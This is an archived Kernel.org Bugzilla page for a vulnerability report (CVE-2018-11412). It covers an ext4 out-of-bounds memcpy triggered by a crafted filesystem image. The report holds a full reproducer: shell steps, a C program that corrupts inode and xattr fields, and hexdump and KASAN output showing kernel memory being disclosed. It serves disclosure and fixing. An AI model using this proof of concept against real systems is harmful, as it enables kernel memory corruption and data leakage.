<!DOCTYPE html>
<html lang="en">
  <head>
    <title>199803 &ndash; out-of-bounds memcpy via non-inline system.data xattr</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link href="data/assets/51af664f3910b417cf7544987d29336d.css" rel="stylesheet" type="text/css">



      

    
<script type="text/javascript" src="data/assets/aae018547291cb399f8ae4d70aa29abc.js"></script>

    <script type="text/javascript">
    <!--
          YAHOO.namespace('bugzilla');
          YAHOO.util.Event.addListener = function (el, sType, fn, obj, overrideContext) {
              if ( ("onpagehide" in window || YAHOO.env.ua.gecko) && sType === "unload") { sType = "pagehide"; };
              var capture = ((sType == "focusin" || sType == "focusout") && !YAHOO.env.ua.ie) ? true : false;
              return this._addListener(el, this._getType(sType), fn, obj, overrideContext, capture);
          };
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }

        
        function unhide_language_selector() {
            $('#lang_links_container').removeClass('bz_default_hidden');
        } 
        $(document).ready(unhide_language_selector);

        // This sets the default parameters for all calendar fields.
        $.datepicker.setDefaults({
            dateFormat: "yy-mm-dd", // this is the YYYY-MM-DD format
            showButtonPanel: true,  // permits to easily select "Today"
            // These 3 parameters are useful for localization.
            firstDay: 0,            // 0 = Sunday, 1 = Monday, etc...
            dayNamesMin: [ "Su", "Mo", "Tu", "We", "Th", "Fr", "Sa" ],
            monthNames: [ "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" ]
        });

        
        var BUGZILLA = {
            param: {
                maxusermatches: 1000
            },
            constant: {
                COMMENT_COLS: 80
            },
            string: {
                

                attach_desc_required:
                    "You must enter a Description for this attachment.",
                component_required:
                    "You must select a Component for this bug.",
                description_required:
                    "You must enter a Description for this bug.",
                short_desc_required:
                    "You must enter a Summary for this bug.",
                version_required:
                    "You must select a Version for this bug."
            }
              , api_token: ''
        };


    if (history && history.replaceState) {
      if(!document.location.href.match(/show_bug\.cgi/)) {
        history.replaceState( null,
                             "199803 – out-of-bounds memcpy via non-inline system.data xattr",
                             "show_bug.cgi?id=199803" );
        document.title = "199803 – out-of-bounds memcpy via non-inline system.data xattr";
      }
      if (document.location.href.match(/show_bug\.cgi\?.*list_id=/)) {
        var href = document.location.href;
        href = href.replace(/[\?&]+list_id=(\d+|cookie)/, '');
        history.replaceState(null, "199803 – out-of-bounds memcpy via non-inline system.data xattr", href);
      }
    }
    YAHOO.util.Event.onDOMReady(function() {
      initDirtyFieldTracking();

    });
    // -->
    </script>
<script type="text/javascript" src="data/assets/b0e9f412b1f97bb1ae7ecfce91ab62bb.js"></script>

    
    <!--[if lt IE 9]>
      <script>
        document.createElement('header');
        document.createElement('nav');
        document.createElement('main');
        document.createElement('footer');
      </script>
    <![endif]-->

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Kernel.org Bugzilla" href="./search_plugin.cgi">
    <link rel="shortcut icon" href="images/favicon.ico"><meta name="robots" content="noarchive">
  </head>

  <body 
        class="bugzilla-kernel-org
                 bz_bug
                 bz_status_NEW
                 bz_product_File_System
                 bz_component_ext4
                 bz_bug_199803 yui-skin-sam">

  <header id="header"><div id="banner">
  </div>

    <div id="titles">
      <span id="title">Kernel.org Bugzilla &ndash; Bug&nbsp;199803</span>

        <span id="subtitle" class="subheader">out-of-bounds memcpy via non-inline system.data xattr</span>

        <span id="information" class="header_addl_info">Last modified: 2018-05-24 19:53:27 UTC</span>
    </div>


    <nav id="common_links"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_top" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_top");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_top" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_top"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/latest/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_top">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_top">
  <span class="separator">| </span>
  <a id="login_link_top" href="show_bug.cgi?id=199803&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_top')">Log In</a>

  <form action="show_bug.cgi?id=199803" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_top">
    <input id="Bugzilla_login_top" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_top" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_top">
    <a href="#" onclick="return hide_mini_login_form('_top')">[x]</a>
  </form>
</li>


  <li id="forgot_container_top">
    <span class="separator">| </span>
    <a id="forgot_link_top" href="createaccount.cgi?request_new_password=1"
       onclick="return show_forgot_form('_top')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_top"
          class="mini_forgot bz_default_hidden">
      <label for="login_top">Login:</label>
      <input name="email" size="20" id="login_top" required
             type="email" placeholder="Your Email Address">
      <input id="forgot_button_top" value="Reset Password"
             type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_top" name="token"
             value="1635622167-E1z6zyRU1A6j61GmBrkCJxl_UCcbsxTaVsqc4Vh3QiA">
      <a href="#" onclick="return hide_forgot_form('_top')">[x]</a>
    </form>
  </li>
</ul>
    </nav>
  </header>

  <main role="main" id="bugzilla-body">


<script type="text/javascript">
<!--

//-->
</script>

<form name="changeform" id="changeform" method="post" action="process_bug.cgi">

  <input type="hidden" name="delta_ts" value="2018-05-24 19:53:27">
  <input type="hidden" name="id" value="199803">
  <input type="hidden" name="token" value="1635622167-p7RFe7KyQwiDoFV622VM6SQxYW231p9_3XJ5DJsZjGk">
<div class="bz_short_desc_container edit_form">
     <a href="show_bug.cgi?id=199803"><b>Bug&nbsp;199803</b></a> <span id="summary_container" class="bz_default_hidden">
      - <span id="short_desc_nonedit_display">out-of-bounds memcpy via non-inline system.data xattr</span>
     </span>

    <div id="summary_input"><span class="field_label "
    id="field_label_short_desc">


  <a 
      title="The bug summary is a short sentence which succinctly describes what the bug is about."
      class="field_help_link"
      href="page.cgi?id=fields.html#short_desc"
  >Summary:</a>

</span>out-of-bounds memcpy via non-inline system.data xattr
    </div>
  </div>
  <script type="text/javascript">
    hideEditableField('summary_container',
                      'summary_input',
                      'summary_edit_action',
                      'short_desc',
                      'out-of-bounds memcpy via non-inline system.data xattr' );
  </script>
  <table class="edit_form">
    <tr>
      
      <td id="bz_show_bug_column_1" class="bz_show_bug_column">
        <table>
          <tr id="field_tablerow_status">
    <th class="field_label">
      <a href="page.cgi?id=fields.html#bug_status">Status</a>:
    </th>
    <td id="bz_field_status">
      <span id="static_bug_status">NEW
      </span>
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr id="field_tablerow_alias"><th class="field_label "
    id="field_label_alias">


  <a 
      title="A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#alias"
  >Alias:</a>

</th>
    <td>
        None
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr id="field_tablerow_product"><th class="field_label "
    id="field_label_product">


  <a 
      title="Bugs are categorised into Products and Components."
      class="field_help_link"
      href="describecomponents.cgi"
  >Product:</a>

</th>
  <td class="field_value "
      id="field_container_product" >File System

</td>
    </tr>

    
    <tr id="field_tablerow_classification" class="bz_default_hidden"><th class="field_label "
    id="field_label_classification">


  <a 
      title="Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation."
      class="field_help_link"
      href="page.cgi?id=fields.html#classification"
  >Classification:</a>

</th>
  <td class="field_value "
      id="field_container_classification" >Unclassified

</td>
    </tr>
    
    
    
    <tr id="field_tablerow_component"><th class="field_label "
    id="field_label_component">


  <a 
      title="Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list."
      class="field_help_link"
      href="describecomponents.cgi?product=File System"
  >Component:</a>

</th>
  <td class="field_value "
      id="field_container_component" >ext4

  (<a href="buglist.cgi?component=ext4&amp;product=File%20System&amp;bug_status=__open__"
      target="_blank">show other bugs</a>)
</td>
    </tr>
    
    
    
    <tr id="field_tablerow_rep_platform"><th class="field_label "
    id="field_label_rep_platform">


  <a 
      title="The hardware platform the bug was observed on. Note: When searching, selecting the option &quot;All&quot; only finds bugs whose value for this field is literally the word &quot;All&quot;."
      class="field_help_link"
      href="page.cgi?id=fields.html#rep_platform"
  >Hardware:</a>

</th>
      <td class="field_value">All
        Linux
      </td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          <tr id="field_tablerow_importance">
      <th class="field_label">
        <label  accesskey="i">
          <a href="page.cgi?id=fields.html#importance"><u>I</u>mportance</a></label>:
      </th>
      <td>P1
       normal
      </td>
    </tr>

          <tr id="field_tablerow_assigned_to"><th class="field_label "
    id="field_label_assigned_to">


  <a 
      title="The person in charge of resolving the bug."
      class="field_help_link"
      href="page.cgi?id=fields.html#assigned_to"
  >Assignee:</a>

</th>
      <td><span class="vcard"><span class="fn">fs_ext4&#64;kernel-bugs.osdl.org</span>
</span>
      </td>
    </tr>

    <script type="text/javascript">
      assignToDefaultOnChange(['product', 'component'],
        'fs_ext4\x40kernel-bugs.osdl.org',
        '');
    </script>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr id="field_tablerow_bug_file_loc"><th class="field_label "
    id="field_label_bug_file_loc">


  <a 
      title="Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen."
      class="field_help_link"
      href="page.cgi?id=fields.html#bug_file_loc"
  >URL:</a>

</th>
    <td>
      <span id="bz_url_input_area">
      </span>
    </td>
  </tr>


    <tr id="field_tablerow_keywords"><th class="field_label "
    id="field_label_keywords">


  <a 
      title="You can add keywords from a defined list to bugs, in order to easily identify and group them."
      class="field_help_link"
      href="describekeywords.cgi"
  >Keywords:</a>

</th>
  <td class="field_value "
      id="field_container_keywords" >

</td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          
<tr id="field_tablerow_dependson"><th class="field_label "
    id="field_label_dependson">


  <a 
      title="The bugs listed here must be resolved before this bug can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#dependson"
  >Depends on:</a>

</th>

  <td>
    <span id="dependson_input_area">
    </span>

  </td>
  </tr>

  <tr><th class="field_label "
    id="field_label_blocked">


  <a 
      title="This bug must be resolved before the bugs listed in this field can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#blocked"
  >Blocks:</a>

</th>

  <td>
    <span id="blocked_input_area">
    </span>

  </td>
  </tr>

        </table>
      </td>
      <td>
        <div class="bz_column_spacer">&nbsp;</div>
      </td>
      
      <td id="bz_show_bug_column_2" class="bz_show_bug_column">
        <table>
        <tr id="field_tablerow_reported">
    <th class="field_label">
      Reported:
    </th>
    <td>2018-05-22 17:53 UTC by <span class="vcard"><span class="fn">Jann Horn (Google)</span>
</span>
    </td>
  </tr>

  <tr id="field_tablerow_modified">
    <th class="field_label">
      Modified:
    </th>
    <td>2018-05-24 19:53 UTC
      (<a href="show_activity.cgi?id=199803">History</a>)
    </td>

  </tr>
<tr id="field_tablerow_cclist">
      <th class="field_label">
        <label  accesskey="a">
          CC List:
        </label>
      </th>
      <td>1
          user
          <span id="cc_edit_area_showhide_container" class="bz_default_hidden">
            (<a href="#" id="cc_edit_area_showhide">show</a>)
          </span>
        <div id="cc_edit_area">
          <br>
            <select id="cc" multiple="multiple" size="5" >
                <option value="carnil">carnil</option>
            </select>
        </div>
          <script type="text/javascript">
            hideEditableField( 'cc_edit_area_showhide_container',
                               'cc_edit_area',
                               'cc_edit_area_showhide',
                               '',
                               '');
          </script>
      </td>
    </tr>

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr id="field_tablerow_see_also"><th class="field_label "
    id="field_label_see_also">


  <a 
      title="This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields."
      class="field_help_link"
      href="page.cgi?id=fields.html#see_also"
  >See Also:</a>

</th>
  <td class="field_value "
      id="field_container_see_also" >

</td>
    </tr>
<tr>
      <th class="field_label "
    id="field_label_cf_kernel_version">


  <a 
      title="A custom Free Text field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#cf_kernel_version"
  >Kernel Version:</a>

</th>
  <td class="field_value "
      id="field_container_cf_kernel_version" >v4.17-rc4+

</td>
    </tr>
    <tr>
      <th class="field_label "
    id="field_label_cf_tree">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#cf_tree"
  >Tree:</a>

</th>
  <td class="field_value "
      id="field_container_cf_tree" >Mainline

</td>
    </tr>
    <tr>
      <th class="field_label "
    id="field_label_cf_regression">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#cf_regression"
  >Regression:</a>

</th>
  <td class="field_value "
      id="field_container_cf_regression" >No

</td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>



        </table>
      </td>
    </tr>
    <tr>
      <td colspan="3">
          <hr id="bz_top_half_spacer">
      </td>
    </tr>
  </table>

  <table id="bz_big_form_parts">
  <tr>
  <td>

    
<script type="text/javascript">
<!--
function toggle_display(link) {
    var table = document.getElementById("attachment_table");
    var view_all = document.getElementById("view_all");
    var hide_obsolete_url_parameter = "&hide_obsolete=1";
    // Store current height for scrolling later
    var originalHeight = table.offsetHeight;
    var rows = YAHOO.util.Dom.getElementsByClassName(
        'bz_tr_obsolete', 'tr', table);

    for (var i = 0; i < rows.length; i++) {
        bz_toggleClass(rows[i], 'bz_default_hidden');
    }

    if (YAHOO.util.Dom.hasClass(rows[0], 'bz_default_hidden')) {
        link.innerHTML = "Show Obsolete";
        view_all.href = view_all.href + hide_obsolete_url_parameter 
    }
    else {
        link.innerHTML = "Hide Obsolete";
        view_all.href = view_all.href.replace(hide_obsolete_url_parameter,"");
    }

    var newHeight = table.offsetHeight;
    // This scrolling makes the window appear to not move at all.
    window.scrollBy(0, newHeight - originalHeight);

    return false;
}
//-->
</script>

<br>
<table id="attachment_table">
  <tr id="a0">
    <th colspan="2" class="left">
      Attachments
    </th>
  </tr>



  <tr class="bz_attach_footer">
    <td colspan="2">
        <a href="attachment.cgi?bugid=199803&amp;action=enter">Add an attachment</a>
        (proposed patch, testcase, etc.)
    </td>
  </tr>
</table>
<br>

  </td>
  <td>
  </td>
  </tr></table>

  
  <div id="comments"><script type="text/javascript">
  var replyCommentConfig = {
      quote_replies : "quoted_reply",
      is_insider : 0,
      markdown_fetching_comment : "Fetching comment..."
  };
</script>


<!-- This auto-sizes the comments and positions the collapse/expand links 
     to the right. -->
<table class="bz_comment_table">
<tr>
<td>
<div id="c0" class="bz_comment bz_first_comment">

      <div class="bz_first_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=199803#c0">Description</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jann Horn (Google)</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2018-05-22 17:53:13 UTC
        </span>

      </div>




<pre class="bz_comment_text">ext4 can store data for small regular files as &quot;inline data&quot;, meaning that the
data is stored inside the corresponding inode instead of in separate blocks.
Inline data is stored in two places: The first 60 bytes go in the i_block field
in the inode (which normally contains a list of blocks instead), the rest goes
in the special filesystem-internal extended attribute &quot;system.data&quot;.

Since commit e50e5129f384 (&quot;ext4: xattr-in-inode support&quot;, in v4.13+), ext4 can
store extended attribute values not only inline in the inode, but can also store
such values in dedicated inodes.

When a corrupted filesystem stores the system.data extended attribute value in a
dedicated inode, the kernel gets confused, causing memory corruption.



ext4_find_inline_data_nolock() attempts to locate an inode's inline data by
searching for the system.data xattr using ext4_xattr_ibody_find().
If the inode has xattrs, ext4_xattr_ibody_find() first checks them for
corruption using xattr_check_inode(), then grabs the wanted xattr using
xattr_find_entry().
xattr_check_inode() uses ext4_xattr_check_entries() to check the individual
xattrs, but skips most checks if `entry-&gt;e_value_inum != 0` (marking an xattr
whose value is in a dedicated inode) - only for inline values, length and offset
checks are performed to ensure that the value actually fits into the inode.
The problem is that ext4_find_inline_data_nolock() then assumes that the
returned xattr uses inline storage and that the returned length will fit into
the inode; it stores the length field from the xattr in
`EXT4_I(inode)-&gt;i_inline_size` without further checks.

Later, when the file is read, ext4_read_inline_data() trusts this length value,
causing an out-of-bounds memcpy() in the following line:

    memcpy(buffer,
           (void *)IFIRST(header) + le16_to_cpu(entry-&gt;e_value_offs), len);



To reproduce, on a system with kernel v4.13 or newer, ideally with KASAN on:

1. Create a new ext4 filesystem image, with 256-byte inodes and inline data
support:

    $ mkfs.ext4 -b 4096 -I 256 -O inline_data testfs.img 400k
    mke2fs 1.43.7 (16-Oct-2017)
    Creating regular file testfs.img

    Filesystem too small for a journal
    Creating filesystem with 100 4k blocks and 64 inodes

    Allocating group tables: done
    Writing inode tables: done
    Writing superblocks and filesystem accounting information: done

2. Create a 75-byte file in the new filesystem:

    $ mkdir mount
    $ sudo mount testfs.img mount
    $ sudo dd bs=75 count=1 if=/dev/zero of=mount/testfile
    1+0 records in
    1+0 records out
    75 bytes copied, 0.000811554 s, 92.4 kB/s
    $ sudo umount mount

3. Bump up the inode size, bump up the xattr size, and mark the xattr value as
   non-inline:

    $ cat fixup.c
    #include &lt;stdint.h&gt;
    #include &lt;fcntl.h&gt;
    #include &lt;err.h&gt;
    #include &lt;stdio.h&gt;
    #include &lt;stdlib.h&gt;
    #include &lt;sys/mman.h&gt;
    #include &lt;sys/stat.h&gt;

    #define __le16 uint16_t
    #define __le32 uint32_t
    #define __u16 uint16_t
    #define __u32 uint32_t
    #define __u8 uint8_t

    /* some definitions from kernel headers */
    #define EXT4_NDIR_BLOCKS    12
    #define EXT4_IND_BLOCK      EXT4_NDIR_BLOCKS
    #define EXT4_DIND_BLOCK     (EXT4_IND_BLOCK + 1)
    #define EXT4_TIND_BLOCK     (EXT4_DIND_BLOCK + 1)
    #define EXT4_N_BLOCKS       (EXT4_TIND_BLOCK + 1)
    #define EXT4_XATTR_MAGIC    0xEA020000
    struct ext4_inode {
      __le16  i_mode;
      __le16  i_uid;
      __le32  i_size_lo;
      __le32  i_atime;
      __le32  i_ctime;
      __le32  i_mtime;
      __le32  i_dtime;
      __le16  i_gid;
      __le16  i_links_count;
      __le32  i_blocks_lo;
      __le32  i_flags;
      union {
        struct {
          __le32  l_i_version;
        } linux1;
      } osd1;
      __le32  i_block[EXT4_N_BLOCKS];
      __le32  i_generation;
      __le32  i_file_acl_lo;
      __le32  i_size_high;
      __le32  i_obso_faddr;
      union {
        struct {
          __le16  l_i_blocks_high;
          __le16  l_i_file_acl_high;
          __le16  l_i_uid_high;
          __le16  l_i_gid_high;
          __le16  l_i_checksum_lo;
          __le16  l_i_reserved;
        } linux2;
      } osd2;
      __le16  i_extra_isize;
      __le16  i_checksum_hi;
      __le32  i_ctime_extra;
      __le32  i_mtime_extra;
      __le32  i_atime_extra;
      __le32  i_crtime;
      __le32  i_crtime_extra;
      __le32  i_version_hi;
      __le32  i_projid;
    };
    struct ext4_xattr_ibody_header {
      __le32  h_magic;
    };
    struct ext4_xattr_entry {
      __u8  e_name_len;
      __u8  e_name_index;
      __le16  e_value_offs;
      __le32  e_value_inum;
      __le32  e_value_size;
      __le32  e_hash;
      char  e_name[0];
    };

    #define INODE_SIZE 256

    #define ROUND_UP(x,round) ( ((x)+((round)-1)) &amp; ~((round)-1) )

    int main(int argc, char **argv) {
      char *path = argv[1];
      int fd = open(path, O_RDWR);
      if (fd == -1) err(1, &quot;open&quot;);
      struct stat st;
      if (fstat(fd, &amp;st)) err(1, &quot;fstat&quot;);
      char *map = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE,
MAP_SHARED, fd, 0);
      if (map == MAP_FAILED) err(1, &quot;mmap&quot;);
      for (int i=0; i&lt;st.st_size/INODE_SIZE; i++) {
        struct ext4_inode *ino = (void*)(map + i * INODE_SIZE);
        if (ino-&gt;i_links_count != 1 || ino-&gt;i_size_lo != 75) continue;
        printf(&quot;found inode (idx=%d, size=%u, mode=%ho)\n&quot;,
               i, ino-&gt;i_size_lo, ino-&gt;i_mode);
        ino-&gt;i_size_lo = 60000;
        printf(&quot;  i_extra_isize = %hu\n&quot;, ino-&gt;i_extra_isize);
        struct ext4_xattr_ibody_header *hdr =
            (void*)( ((char*)ino)+128+ino-&gt;i_extra_isize );
        if (hdr-&gt;h_magic != EXT4_XATTR_MAGIC) continue;
        struct ext4_xattr_entry *entry = (void*)(hdr+1);
        while (*(uint32_t*)entry != 0) {
          printf(&quot;  attr: idx=%hhu name='%*s' offs=%hu inum=%u size=%u\n&quot;,
              entry-&gt;e_name_index, entry-&gt;e_name_len, entry-&gt;e_name,
              entry-&gt;e_value_offs, entry-&gt;e_value_inum, entry-&gt;e_value_size);
          entry-&gt;e_value_offs = 0;
          entry-&gt;e_value_inum = 20;
          entry-&gt;e_value_size = 60000;
          entry = (void*)(
              (char*)entry + sizeof(*entry) + ROUND_UP(entry-&gt;e_name_len, 4)
          );
        }
      }
    }
    $ gcc -o fixup fixup.c -Wall
    $ ./fixup testfs.img
    found inode (idx=555, size=75, mode=100644)
      i_extra_isize = 32
      attr: idx=7 name='data' offs=76 inum=0 size=15

4. Use fsck to fix up the inode checksum (but don't let it fix anything else!):

    $ fsck.ext4 -f testfs.img
    e2fsck 1.43.7 (16-Oct-2017)
    Pass 1: Checking inodes, blocks, and sizes
    Inode 12 has INLINE_DATA_FL flag but extended attribute not found.
Truncate&lt;y&gt;? no
    Extended attribute in inode 12 has a value size (60000) which is invalid
    Clear&lt;y&gt;? no
    Inode 12 passes checks, but checksum does not match inode.  Fix&lt;y&gt;? yes
    Pass 2: Checking directory structure
    Pass 3: Checking directory connectivity
    Pass 4: Checking reference counts
    Pass 5: Checking group summary information

    testfs.img: ***** FILE SYSTEM WAS MODIFIED *****

    testfs.img: ********** WARNING: Filesystem still has errors **********

    testfs.img: 12/64 files (0.0% non-contiguous), 13/100 blocks

5. Mount the filesystem again:

    $ sudo mount testfs.img mount

6. Read the file:

    $ hexdump -C mount/testfile
    00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
|................|
    *
    00000030  00 00 00 00 00 00 00 00  00 00 00 00 04 07 00 00
|................|
    00000040  14 00 00 00 60 ea 00 00  00 00 00 00 64 61 74 61
|....`.......data|
    00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
|................|
    *
    000004a0  31 00 00 00 00 00 00 00  e0 d1 fc 98 d7 7f 00 00
|1...............|
    000004b0  e0 07 03 99 d7 7f 00 00  00 00 00 00 00 00 00 00
|................|
    000004c0  00 00 00 00 00 00 00 00  e0 5f 00 00 00 00 00 00
|........._......|
    000004d0  64 00 00 00 00 00 00 00  f0 af 02 99 d7 7f 00 00
|d...............|
    000004e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
|................|
    [...]

7. Check dmesg:

    $ dmesg
    [...]
    [ 3211.552729]
==================================================================
    [ 3211.552782] BUG: KASAN: use-after-free in
ext4_read_inline_data+0x114/0x120 [ext4]
    [ 3211.552787] Write of size 59940 at addr ffff8802ba1d003c by
task pool/12922

    [ 3211.552796] CPU: 3 PID: 12922 Comm: pool Not tainted 4.17.0-rc4+ #7
    [ 3211.552798] Hardware name: LENOVO 20FCS12V06/20FCS12V06, BIOS
N1FET43W (1.17 ) 08/02/2016
    [ 3211.552799] Call Trace:
    [ 3211.552807]  dump_stack+0x71/0xab
    [ 3211.552813]  print_address_description+0x6a/0x250
    [ 3211.552817]  kasan_report+0x258/0x380
    [ 3211.552863]  ? ext4_read_inline_data+0x114/0x120 [ext4]
    [ 3211.552867]  memcpy+0x34/0x50
    [ 3211.552914]  ext4_read_inline_data+0x114/0x120 [ext4]
    [ 3211.552961]  ext4_read_inline_page+0x1e4/0x2a0 [ext4]
    [ 3211.553006]  ? ext4_read_inline_data+0x120/0x120 [ext4]
    [ 3211.553053]  ext4_readpage_inline+0x13e/0x160 [ext4]
    [ 3211.553101]  ext4_readpage+0xf5/0x110 [ext4]
    [ 3211.553106]  generic_file_read_iter+0x9a4/0xea0
    [ 3211.553112]  ? filemap_range_has_page+0x160/0x160
    [ 3211.553116]  ? save_stack+0x89/0xb0
    [ 3211.553120]  ? __kasan_slab_free+0x105/0x150
    [ 3211.553124]  ? aa_path_link+0x1f0/0x1f0
    [ 3211.553128]  ? do_syscall_64+0x150/0x160
    [ 3211.553132]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [ 3211.553137]  ? audit_watch_compare+0x1b/0x50
    [ 3211.553142]  __vfs_read+0x239/0x340
    [ 3211.553145]  ? __x64_sys_copy_file_range+0x2d0/0x2d0
    [ 3211.553149]  ? dput.part.19+0x2e/0x1b0
    [ 3211.553154]  ? auditd_test_task+0x43/0x60
    [ 3211.553158]  vfs_read+0xa5/0x190
    [ 3211.553162]  ksys_read+0xa1/0x120
    [ 3211.553166]  ? kernel_write+0xa0/0xa0
    [ 3211.553171]  do_syscall_64+0x6d/0x160
    [ 3211.553175]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [ 3211.553178] RIP: 0033:0x7f9ada1af72c
    [ 3211.553180] RSP: 002b:00007f9ac2258888 EFLAGS: 00000246
ORIG_RAX: 0000000000000000
    [...]
    [ 3211.553197] The buggy address belongs to the page:
    [ 3211.553202] page:ffffea000ae87400 count:2 mapcount:0
mapping:ffff88021fe57898 index:0x0
    [ 3211.553207] flags: 0x17fffc000000021(locked|lru)
    [ 3211.553213] raw: 017fffc000000021 ffff88021fe57898
0000000000000000 00000002ffffffff
    [ 3211.553219] raw: ffffea000858fc20 ffff8803d0a204a0
0000000000000000 ffff8803cf31cac0
    [ 3211.553222] page dumped because: kasan: bad access detected
    [ 3211.553224] page-&gt;mem_cgroup:ffff8803cf31cac0

    [ 3211.553229] Memory state around the buggy address:
    [ 3211.553234]  ffff8802ba1d0f00: 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00
    [ 3211.553238]  ffff8802ba1d0f80: 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00
    [ 3211.553243] &gt;ffff8802ba1d1000: ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff
    [ 3211.553246]                    ^
    [ 3211.553250]  ffff8802ba1d1080: ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff
    [ 3211.553254]  ffff8802ba1d1100: ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff
    [ 3211.553257]
==================================================================

Occasionally this will also cause unrelated userspace processes to segfault.</pre>
    </div>

    <div id="c1" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=199803#c1">Comment 1</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Salvatore Bonaccorso</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2018-05-24 19:53:27 UTC
        </span>

      </div>




<pre class="bz_comment_text"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11412">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11412</a> was assigned for this issue by MITRE.</pre>
    </div>


  

</td>
<td>
</td>
</tr></table>
  </div>

    <hr><div id="add_comment" class="bz_section_additional_comments">
      <table>
        <tr>
          <td>
            <fieldset>
              <legend>Note</legend>
              You need to
              <a href="show_bug.cgi?id=199803&amp;GoAheadAndLogIn=1">log in</a>
              before you can comment on or make changes to this bug.
            </fieldset>
          </td>
        </tr>
      </table>
  </div>

</form>

<hr>
<ul class="related_actions">
    <li><a href="show_bug.cgi?format=multiple&amp;id=199803">Format For Printing</a></li>
    <li>&nbsp;-&nbsp;<a href="show_bug.cgi?ctype=xml&amp;id=199803">XML</a></li>
    <li>&nbsp;-&nbsp;<a href="enter_bug.cgi?cloned_bug_id=199803">Clone This Bug</a></li>
    
    <li>&nbsp;-&nbsp;<a href="#">Top of page </a></li>
    </ul>

<br>
</main>

    <footer id="footer">
      <div class="intro"></div>

      <nav><ul id="useful-links">
  <li id="links-actions"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
